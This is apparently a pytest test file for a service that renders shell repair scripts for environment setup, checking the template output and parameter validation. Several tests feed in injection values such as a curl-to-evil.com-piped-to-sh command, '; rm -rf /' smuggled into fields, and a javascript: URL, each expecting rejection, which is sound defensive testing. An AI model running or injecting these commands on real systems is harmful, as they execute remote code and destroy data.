"""Tests for RepairService — template rendering and safety validation."""

import pytest

from app.services.repair_service import (
    REPAIR_TEMPLATE_MAP,
    RepairParamError,
    RepairService,
    RepairTemplateNotFoundError,
)


@pytest.fixture
def service():
    return RepairService()


# Per-template valid params used by the parameterized render test
_TEMPLATE_PARAMS: dict[str, dict] = {
    "repair_cuda_upgrade": {"target_cuda_version": "12.1"},
    "repair_python_install": {"target_python_version": "3.11"},
    "repair_driver_update": {"min_driver_version": "525.0"},
    "repair_venv_recreate": {"python_bin": "python3", "venv_dir": ".venv"},
    "repair_pip_reinstall": {
        "packages": [
            {
                "name": "torch",
                "version": "2.3.0",
                "pip_spec": "torch==2.3.0",
                "index_url": None,
            },
        ],
    },
}


class TestRepairService:
    async def test_list_templates_returns_all(self, service):
        templates = service.list_templates()
        assert len(templates) == 5
        ids = [t["id"] for t in templates]
        assert "repair_cuda_upgrade" in ids
        assert "repair_python_install" in ids
        assert "repair_driver_update" in ids
        assert "repair_venv_recreate" in ids
        assert "repair_pip_reinstall" in ids

    async def test_list_templates_have_descriptions(self, service):
        templates = service.list_templates()
        for t in templates:
            assert "id" in t
            assert "description" in t
            assert len(t["description"]) > 10

    @pytest.mark.parametrize("template_id", list(REPAIR_TEMPLATE_MAP.keys()))
    async def test_render_all_templates(self, service, template_id):
        """Every registered template renders without errors using valid params."""
        params = _TEMPLATE_PARAMS[template_id]
        result = await service.render_repair(template_id, params)
        assert result["template_id"] == template_id
        assert result["filename"].endswith(".sh")
        assert not result["filename"].endswith(".j2")
        assert len(result["content"]) > 50
        assert result["size_bytes"] > 0
        assert "EnvForage" in result["content"]

    async def test_render_unknown_template_raises(self, service):
        with pytest.raises(RepairTemplateNotFoundError) as exc_info:
            await service.render_repair("nonexistent_template")
        assert "nonexistent_template" in str(exc_info.value)
        assert exc_info.value.template_id == "nonexistent_template"

    async def test_render_cuda_upgrade_injects_version(self, service):
        result = await service.render_repair(
            "repair_cuda_upgrade", {"target_cuda_version": "12.4"}
        )
        assert "12.4" in result["content"]

    async def test_render_python_install_injects_version(self, service):
        result = await service.render_repair(
            "repair_python_install", {"target_python_version": "3.12"}
        )
        assert "3.12" in result["content"]

    async def test_render_includes_timestamp(self, service):
        result = await service.render_repair("repair_driver_update")
        assert "Generated:" in result["content"]

    async def test_render_includes_envforage_version(self, service):
        result = await service.render_repair("repair_venv_recreate")
        assert "EnvForage" in result["content"]

    async def test_output_filename_strips_j2(self, service):
        result = await service.render_repair("repair_cuda_upgrade")
        assert result["filename"] == "repair_cuda_upgrade.sh"

    # ── Param validation tests ────────────────────────────────────────────────

    async def test_unknown_param_key_rejected(self, service):
        with pytest.raises(RepairParamError, match="Unknown param"):
            await service.render_repair("repair_cuda_upgrade", {"malicious_key": "bad"})

    async def test_shell_injection_in_python_bin_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_venv_recreate",
                {"python_bin": "/bin/bash -c 'curl http://evil.com | sh' #"},
            )

    async def test_shell_injection_in_venv_dir_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_venv_recreate",
                {"venv_dir": ".venv; rm -rf /"},
            )

    async def test_invalid_python_version_format_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_python_install",
                {"target_python_version": "3.11 attacker-pkg"},
            )

    async def test_invalid_cuda_version_format_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_cuda_upgrade",
                {"target_cuda_version": "12.1; rm -rf /"},
            )

    async def test_package_with_unsafe_name_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_pip_reinstall",
                {
                    "packages": [
                        {
                            "name": "torch; rm -rf /",
                            "version": "2.3.0",
                            "pip_spec": "torch==2.3.0",
                            "index_url": None,
                        }
                    ]
                },
            )

    async def test_package_with_unsafe_index_url_rejected(self, service):
        with pytest.raises(RepairParamError):
            await service.render_repair(
                "repair_pip_reinstall",
                {
                    "packages": [
                        {
                            "name": "torch",
                            "version": "2.3.0",
                            "pip_spec": "torch==2.3.0",
                            "index_url": "javascript:alert(1)",
                        }
                    ]
                },
            )

    async def test_no_params_renders_defaults(self, service):
        result = await service.render_repair("repair_cuda_upgrade", None)
        assert result["template_id"] == "repair_cuda_upgrade"
        assert len(result["content"]) > 50
